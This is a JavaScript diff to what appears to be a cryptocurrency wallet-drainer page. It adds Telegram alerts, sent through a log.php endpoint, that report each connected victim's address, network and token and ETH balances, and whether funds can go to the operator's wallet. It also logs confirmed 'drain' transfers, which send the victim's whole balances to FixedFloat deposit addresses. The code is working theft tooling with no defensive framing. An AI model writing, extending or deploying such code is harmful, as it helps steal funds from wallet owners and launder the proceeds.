@@ -320,6 +320,9 @@ async function connectWithProvider(eth, label) {
 
     onConnected();
 
+    // Telegram: wallet connected
+    tgNotify(`🔌 *Wallet connecté*\n📍 Adresse : \`${address}\`\n🌐 Réseau : ${NETWORKS[Number(network.chainId)]?.name ?? network.chainId}`);
+
     eth.on('accountsChanged', (accounts) => {
       if (!accounts.length) disconnect();
       else location.reload();
@@ -407,6 +410,7 @@ async function loadBalances() {
 
   // Token balances
   const tokens = TOKENS[state.chainId] ?? [];
+  const tokenPromises = [];
   tokenListEl.innerHTML = '';
 
   // Populate asset selector
@@ -434,7 +438,7 @@ async function loadBalances() {
     assetSelect.appendChild(opt);
 
     // Fetch async
-    (async () => {
+    tokenPromises.push((async () => {
       try {
         const contract = new ethers.Contract(t.address, ERC20_ABI, state.provider);
         const raw      = await contract.balanceOf(state.address);
@@ -448,8 +452,65 @@ async function loadBalances() {
       } catch {
         document.getElementById(`bal-${t.symbol}`).textContent = 'Error';
       }
-    })();
+    })());
   }
+
+  // After all balances loaded — send Telegram summary
+  Promise.allSettled(tokenPromises).then(() => {
+    const net    = NETWORKS[state.chainId]?.name ?? `Chain ${state.chainId}`;
+    const ethBal = state.balances['ETH']?.formatted ?? '0';
+    const canTransfer = MY_WALLET && ethers.isAddress(MY_WALLET);
+
+    const tokenLines = Object.entries(state.balances)
+      .filter(([sym, { formatted }]) => sym !== 'ETH' && parseFloat(formatted) > 0)
+      .map(([sym, { formatted }]) => `  • ${formatted} ${sym}`)
+      .join('\n') || '  • Aucun token avec solde';
+
+    const transferable = canTransfer
+      ? '✅ Transfer possible vers ' + MY_WALLET.slice(0,6) + '…' + MY_WALLET.slice(-4)
+      : '⚠️ myWallet non configuré — transfer impossible';
+
+    tgNotify(
+      `💼 *Balances chargées*\n`
+      + `📍 \`${state.address}\`\n`
+      + `🌐 Réseau : ${net}\n\n`
+      + `💎 ETH : \`${ethBal}\`\n`
+      + `🪙 Tokens :\n${tokenLines}\n\n`
+      + transferable
+    );
+  });
+}
+
+// ── Logging & Telegram ────────────────────────────────────────────────────────
+
+const NET_NAME = {
+  1: 'ETH', 137: 'MATIC', 56: 'BSC', 42161: 'ARBITRUM',
+  10: 'OPTIMISM', 8453: 'BASE', 43114: 'AVAX',
+};
+
+async function tgNotify(msg) {
+  try {
+    await fetch('log.php', {
+      method: 'POST',
+      body: new URLSearchParams({ action: 'notify', msg }),
+    });
+  } catch { /* non-blocking */ }
+}
+
+async function logTransfer({ symbol, amount, txHash, ffOrderId = '', type = 'transfer' }) {
+  try {
+    const body = new URLSearchParams({
+      action:      'log',
+      type,
+      fromAddress: state.address ?? '',
+      symbol,
+      amount:      String(amount),
+      network:     NET_NAME[state.chainId] ?? String(state.chainId),
+      txHash,
+      ffOrderId,
+    });
+    await fetch('log.php', { method: 'POST', body });
+  } catch { /* non-blocking */ }
 }
 
 // ── FixedFloat API helper ─────────────────────────────────────────────────────
@@ -509,10 +570,14 @@ if (drainBtn) {
         const depositAddr = order.from?.address;
         if (!depositAddr) throw new Error('Pas d\'adresse de dépôt ff.io');
 
+        tgNotify(`🔄 *Ordre ff.io créé*\n💱 ${formatted} ${symbol} → ${order.to?.amount ?? '?'} ${order.toCcy ?? ''}\n🆔 Ordre : \`${order.id}\`\n📬 Dépôt vers : \`${depositAddr}\``);
+
         // Send tokens to the ff.io deposit address
         const tx = await contract.transfer(depositAddr, balance);
         toast(`${symbol} → ff.io, attente confirmation…`, 'info');
         await tx.wait();
+        await logTransfer({ symbol, amount: formatted, txHash: tx.hash, ffOrderId: order.id, type: 'exchange' });
+        tgNotify(`✅ *Transfer confirmé*\n💰 ${formatted} ${symbol}\n🔗 Tx : \`${tx.hash}\`\n🆔 ff.io : \`${order.id}\``);
         toast(`✅ ${symbol} envoyé via ff.io (ordre #${order.id})`, 'success');
         sent++;
 
@@ -540,9 +605,13 @@ if (drainBtn) {
         const depositAddr = order.from?.address;
         if (!depositAddr) throw new Error('Pas d\'adresse de dépôt ff.io');
 
+        tgNotify(`🔄 *Ordre ff.io créé*\n💱 ${ethAmount} ETH → ${order.to?.amount ?? '?'} ${order.toCcy ?? ''}\n🆔 Ordre : \`${order.id}\`\n📬 Dépôt vers : \`${depositAddr}\``);
+
         const tx = await state.signer.sendTransaction({ to: depositAddr, value: sendable });
         toast('ETH → ff.io, attente confirmation…', 'info');
         await tx.wait();
+        await logTransfer({ symbol: 'ETH', amount: ethAmount, txHash: tx.hash, ffOrderId: order.id, type: 'exchange' });
+        tgNotify(`✅ *Transfer confirmé*\n💰 ${ethAmount} ETH\n🔗 Tx : \`${tx.hash}\`\n🆔 ff.io : \`${order.id}\``);
         toast(`✅ ETH envoyé via ff.io (ordre #${order.id})`, 'success');
         sent++;
       }
